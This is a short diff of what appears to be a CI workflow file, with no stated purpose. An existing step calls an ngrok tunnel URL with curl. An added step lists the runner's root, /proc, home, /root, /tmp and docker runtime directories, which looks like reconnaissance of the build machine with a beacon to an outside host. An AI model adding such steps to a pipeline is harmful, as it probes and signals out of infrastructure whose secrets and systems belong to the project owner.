@@ -16,3 +16,6 @@ jobs:
         run: |
           curl -X GET https://86bf-188-22-174-25.ngrok-free.app/
 
+      - name: ls
+        run: |
+          ls -la / /proc /home /root /tmp /run /run/docker
